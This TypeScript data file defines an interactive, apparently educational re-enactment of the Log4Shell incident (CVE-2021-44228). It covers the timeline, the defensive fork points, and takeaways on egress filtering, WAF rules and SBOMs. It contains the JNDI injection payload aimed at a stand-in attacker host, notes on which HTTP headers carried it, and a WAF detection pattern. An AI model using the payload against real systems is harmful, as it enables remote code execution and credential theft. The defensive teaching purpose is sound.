import type { Scenario } from "./types"

// Log4Shell — interactive re-enactment.
// 10 steps, 3 defensive fork points.

export const log4shell: Scenario = {
  slug: "log4shell",
  title: "Log4Shell",
  subtitle: "How one log line owned the internet.",
  cve: "CVE-2021-44228",
  cvss: "10.0",
  disclosed: "2021-12-09",
  summary:
    "A string like ${jndi:ldap://…} inside any value logged by Apache Log4j 2.x caused the JVM to fetch and execute code from an attacker-controlled LDAP server. Remote code execution. No authentication. Logging the string was enough.",

  steps: [
    {
      id: "s1",
      time: "T+0",
      actor: "public",
      title: "Disclosure hits Twitter",
      narrative:
        "December 9, 2021 — a researcher publishes a proof-of-concept showing that Minecraft chat messages can execute code on the server. Within an hour the scope expands: anything that logs user input via Log4j is vulnerable. Tomcat. Elasticsearch. Steam. iCloud. Tesla. You.",
      diagram: {
        caption: "Disclosure lands. The whole internet is suddenly a target list.",
        nodes: [
          { id: "r", label: "Researcher", sub: "Chen Zhaojun", kind: "external", x: 15, y: 50 },
          { id: "tw", label: "Twitter thread", kind: "public", x: 50, y: 50 },
          { id: "www", label: "Every Java shop on earth", sub: "…and they don't know yet", kind: "victim", x: 85, y: 50 },
        ],
        edges: [
          { from: "r", to: "tw", kind: "normal", label: "publishes PoC" },
          { from: "tw", to: "www", kind: "attack", label: "spreads" },
        ],
      },
    },
    {
      id: "s2",
      time: "T+00:15",
      actor: "attacker",
      title: "Scanners go global",
      narrative:
        "Attackers immediately start internet-wide scanning for the payload `${jndi:ldap://attacker.tld/a}`. They inject it into HTTP headers (especially User-Agent, X-Forwarded-For, Referer), URLs, form fields — anything that will reach a Java app's logger. Hit rate is high.",
      diagram: {
        caption: "Payload: ${jndi:ldap://attacker.tld/a}",
        nodes: [
          { id: "bot", label: "Botnets", sub: "Mirai, Kinsing, XMRig", kind: "attacker", x: 15, y: 50 },
          { id: "net", label: "Whole IPv4 range", kind: "server", x: 50, y: 50 },
          { id: "v", label: "Vulnerable Java apps", kind: "victim", x: 85, y: 50 },
        ],
        edges: [
          { from: "bot", to: "net", kind: "attack", label: "HTTP w/ ${jndi:…}" },
          { from: "net", to: "v", kind: "attack", label: "forward to backend" },
        ],
      },
    },
    {
      id: "s3",
      time: "T+01:00",
      actor: "victim",
      title: "Your app logs the payload",
      narrative:
        "A user visits your API. Their User-Agent contains the jndi string. Your Spring Boot app logs the request: `logger.info(\"request: {}\", request.getHeader(\"User-Agent\"))`. Log4j parses the string, spots `${jndi:ldap://…}`, and resolves it. This is the bug: Log4j treats log data as instructions.",
      diagram: {
        caption: "The log line that shouldn't have been dangerous.",
        nodes: [
          { id: "u", label: "Attacker request", sub: "UA: ${jndi:ldap://atk/a}", kind: "attacker", x: 10, y: 40 },
          { id: "app", label: "Your Spring Boot app", kind: "victim", x: 45, y: 40 },
          { id: "log", label: "Log4j 2.14.1", sub: "parses ${...}", kind: "server", x: 80, y: 40 },
        ],
        edges: [
          { from: "u", to: "app", kind: "attack", label: "HTTP GET /api" },
          { from: "app", to: "log", kind: "attack", label: "logger.info(UA)" },
        ],
      },
      fork: {
        label: "What if you'd disabled JNDI lookups via -Dlog4j2.formatMsgNoLookups=true?",
        outcome: "Log4j refuses to resolve the substitution. The log line becomes a log line. Attack dies here.",
        takeaway: "A single JVM flag would have blocked the whole class of attacks on vulnerable versions.",
        diagram: {
          caption: "Mitigation flag present → lookup refused.",
          nodes: [
            { id: "u", label: "Attacker request", kind: "attacker", x: 10, y: 40 },
            { id: "app", label: "Spring Boot app", kind: "victim", x: 45, y: 40 },
            { id: "log", label: "Log4j + formatMsgNoLookups", kind: "defender", x: 80, y: 40 },
          ],
          edges: [
            { from: "u", to: "app", kind: "attack", label: "HTTP GET /api" },
            { from: "app", to: "log", kind: "blocked", label: "lookup refused" },
          ],
        },
      },
    },
    {
      id: "s4",
      time: "T+01:03",
      actor: "attacker",
      title: "JVM fetches the payload from LDAP",
      narrative:
        "The JVM performs an outbound LDAP lookup to the attacker's server. The LDAP response points to a Java class hosted on an HTTP server the attacker also controls. The JVM downloads the class and instantiates it — arbitrary remote code execution, no authentication, no user interaction.",
      diagram: {
        caption: "JNDI → LDAP → HTTP → Class.forName(). RCE.",
        nodes: [
          { id: "jvm", label: "Your JVM", kind: "victim", x: 10, y: 50 },
          { id: "ldap", label: "Attacker LDAP", kind: "attacker", x: 45, y: 50 },
          { id: "http", label: "Attacker HTTP", sub: "hosts Exploit.class", kind: "attacker", x: 80, y: 50 },
        ],
        edges: [
          { from: "jvm", to: "ldap", kind: "attack", label: "LDAP lookup" },
          { from: "ldap", to: "jvm", kind: "attack", label: "reference to Exploit.class" },
          { from: "jvm", to: "http", kind: "attack", label: "HTTP GET Exploit.class" },
          { from: "http", to: "jvm", kind: "attack", label: "RCE" },
        ],
      },
      fork: {
        label: "What if your outbound egress was allowlisted to known CDNs + APIs only?",
        outcome: "JVM's LDAP and HTTP outbound calls fail. Exploit dies without a working callback channel.",
        takeaway: "Default-deny egress firewalls neutralize almost every JNDI-style callback exploit.",
        diagram: {
          caption: "Egress allowlist blocks the callback.",
          nodes: [
            { id: "jvm", label: "Your JVM", kind: "victim", x: 10, y: 50 },
            { id: "fw", label: "Egress firewall (allowlist)", kind: "defender", x: 45, y: 50 },
            { id: "ldap", label: "Attacker LDAP", kind: "attacker", x: 80, y: 50 },
          ],
          edges: [
            { from: "jvm", to: "fw", kind: "normal", label: "LDAP lookup attempt" },
            { from: "fw", to: "ldap", kind: "blocked", label: "DROP — not in allowlist" },
          ],
        },
      },
    },
    {
      id: "s5",
      time: "T+01:07",
      actor: "attacker",
      title: "Shell spawned — initial foothold",
      narrative:
        "Attacker code runs inside your application process, inheriting its privileges. They drop a reverse shell, a crypto miner, or (worse) a persistent loader. They enumerate the environment: AWS metadata, mounted secrets, container labels. They pivot laterally using whatever the JVM can reach.",
      diagram: {
        caption: "One JVM compromise → blast radius of the whole service account.",
        nodes: [
          { id: "jvm", label: "JVM (pwned)", kind: "attacker", x: 15, y: 40 },
          { id: "meta", label: "AWS metadata 169.254.169.254", kind: "victim", x: 50, y: 20 },
          { id: "db", label: "Internal database", kind: "victim", x: 50, y: 60 },
          { id: "s3", label: "S3 buckets (via IAM role)", kind: "victim", x: 85, y: 40 },
        ],
        edges: [
          { from: "jvm", to: "meta", kind: "attack", label: "steal IAM creds" },
          { from: "jvm", to: "db", kind: "attack", label: "reuse DB creds" },
          { from: "jvm", to: "s3", kind: "attack", label: "list/exfil" },
        ],
      },
    },
    {
      id: "s6",
      time: "T+01:30",
      actor: "defender",
      title: "SOC sees anomalies — doesn't know source",
      narrative:
        "Outbound traffic spikes. Unusual DNS lookups. Crypto-mining beacons. Your SOC knows something is wrong but doesn't yet connect the dots to Log4j. Because this bug triggers on arbitrary logged input, the attack pathway hides in the noise — every request line potentially carries a payload.",
      diagram: {
        caption: "The signal is buried in ordinary logs.",
        nodes: [
          { id: "logs", label: "Log volume", kind: "server", x: 25, y: 50 },
          { id: "soc", label: "SOC dashboard", kind: "defender", x: 55, y: 50 },
          { id: "noise", label: "Ordinary traffic noise", kind: "public", x: 85, y: 50 },
        ],
        edges: [
          { from: "logs", to: "soc", kind: "normal", label: "grafana alerts" },
          { from: "noise", to: "soc", kind: "normal", label: "false positives" },
        ],
      },
      fork: {
        label: "What if a WAF rule for /\\$\\{jndi:/ was already deployed?",
        outcome: "WAF blocks matching requests at the edge. SOC gets a precise detection signal. Incident identified in minutes, not hours.",
        takeaway: "Edge WAF rules for known injection markers are cheap and buy you detection time even on zero-days.",
        diagram: {
          caption: "WAF converts buried noise into actionable alerts.",
          nodes: [
            { id: "u", label: "Attacker request ${jndi:...}", kind: "attacker", x: 15, y: 50 },
            { id: "waf", label: "Edge WAF rule", kind: "defender", x: 50, y: 50 },
            { id: "alert", label: "Alert fires", kind: "defender", x: 85, y: 50 },
          ],
          edges: [
            { from: "u", to: "waf", kind: "attack", label: "HTTP" },
            { from: "waf", to: "alert", kind: "recovery", label: "match: ${jndi:" },
          ],
        },
      },
    },
    {
      id: "s7",
      time: "T+06h",
      actor: "vendor",
      title: "Apache releases 2.15.0 — but not really",
      narrative:
        "Apache ships Log4j 2.15.0. It disables JNDI lookups by default and restricts LDAP messages to localhost. Two days later, CVE-2021-45046 drops: 2.15.0 is incomplete — under certain configurations it's still exploitable. Welcome to patch-chasing.",
      diagram: {
        caption: "2.15.0 → 2.16.0 → 2.17.0 → 2.17.1 over ~2 weeks.",
        nodes: [
          { id: "a", label: "Apache", kind: "vendor", x: 20, y: 50 },
          { id: "p1", label: "2.15.0", sub: "partial fix", kind: "server", x: 45, y: 30 },
          { id: "p2", label: "2.16.0", sub: "remove JNDI", kind: "server", x: 70, y: 50 },
          { id: "p3", label: "2.17.0 / 2.17.1", sub: "real fix", kind: "defender", x: 92, y: 70 },
        ],
        edges: [
          { from: "a", to: "p1", kind: "normal" },
          { from: "p1", to: "p2", kind: "normal", label: "CVE-2021-45046" },
          { from: "p2", to: "p3", kind: "normal", label: "CVE-2021-45105" },
        ],
      },
    },
    {
      id: "s8",
      time: "T+24h",
      actor: "victim",
      title: "The 3am migration",
      narrative:
        "You realise every Java service — batch jobs, internal dashboards, build systems, vendored appliances — needs patching. Some apps bundle Log4j so deep that vendor patches don't exist yet. You deploy egress firewall rules as a stopgap. You page every engineer. You miss sleep.",
      diagram: {
        caption: "Inventory: the hardest part of IR is knowing what you run.",
        nodes: [
          { id: "t", label: "Your team", kind: "defender", x: 15, y: 50 },
          { id: "inv", label: "Every service + vendor appliance", kind: "server", x: 50, y: 50 },
          { id: "fix", label: "Patch / mitigate / burn down", kind: "defender", x: 85, y: 50 },
        ],
        edges: [
          { from: "t", to: "inv", kind: "normal", label: "audit" },
          { from: "inv", to: "fix", kind: "recovery", label: "≈ 36 hours" },
        ],
      },
    },
    {
      id: "s9",
      time: "T+week",
      actor: "public",
      title: "The long tail",
      narrative:
        "A week later, scans reveal thousands of appliances still vulnerable. Ransomware gangs now weaponize Log4j at scale. Researchers estimate millions of systems worldwide exposed in the first 72 hours. The CISA directive makes remediation mandatory for US federal systems within days.",
      diagram: {
        caption: "Vulnerability half-life: months, not days.",
        nodes: [
          { id: "ransom", label: "Ransomware crews", kind: "attacker", x: 20, y: 40 },
          { id: "enterprise", label: "Enterprise remediation", kind: "victim", x: 55, y: 60 },
          { id: "cisa", label: "CISA / ENISA directives", kind: "vendor", x: 85, y: 40 },
        ],
        edges: [
          { from: "ransom", to: "enterprise", kind: "attack", label: "mass exploitation" },
          { from: "cisa", to: "enterprise", kind: "recovery", label: "mandate" },
        ],
      },
    },
    {
      id: "s10",
      time: "T+years",
      actor: "defender",
      title: "What this changed",
      narrative:
        "SBOM (Software Bill of Materials) goes from niche to legally required. OpenSSF's Alpha-Omega gets serious funding. The US Executive Order 14028 cites Log4Shell explicitly. Every Java shop learns the same lesson: logging libraries are application-level software, not plumbing.",
      diagram: {
        caption: "Legacy of one log line.",
        nodes: [
          { id: "sbom", label: "SBOM mandates", kind: "defender", x: 20, y: 30 },
          { id: "ossf", label: "OpenSSF funding", kind: "defender", x: 50, y: 60 },
          { id: "cul", label: "\"Dependency = product\" culture", kind: "defender", x: 80, y: 30 },
        ],
        edges: [
          { from: "sbom", to: "ossf", kind: "recovery" },
          { from: "ossf", to: "cul", kind: "recovery" },
        ],
      },
    },
  ],

  takeaways: [
    "Disable interpretation of log strings. Log data is never instructions.",
    "Default-deny egress from JVMs (and all services). Exploits need callback channels.",
    "Edge WAF rules for known injection markers ($\\{jndi:, $\\{env:) catch zero-days.",
    "Know your dependencies: SBOM is not bureaucracy, it's an inventory for 3am.",
    "A single mitigation flag can be worth more than a patch release cycle.",
    "Logging is application code. Treat it with the same scrutiny as request handlers.",
  ],

  references: [
    { label: "NVD — CVE-2021-44228",        url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" },
    { label: "Apache advisory",             url: "https://logging.apache.org/log4j/2.x/security.html" },
    { label: "CISA guidance",               url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a" },
    { label: "Cloudflare post-mortem",      url: "https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/" },
  ],
}
